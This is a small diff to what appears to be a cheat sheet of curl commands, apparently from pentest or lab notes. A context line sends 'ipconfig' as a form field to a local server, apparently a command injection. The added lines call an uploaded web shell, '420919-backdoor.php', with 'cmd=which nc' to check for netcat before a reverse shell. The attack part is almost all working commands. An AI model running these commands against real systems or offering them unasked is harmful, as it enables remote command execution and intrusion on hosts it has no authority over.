@@ -11,4 +11,7 @@ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
 
 # Download a file
 curl --output file.txt "google.com/something.img"
+
+# Encode sent data
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
 ```
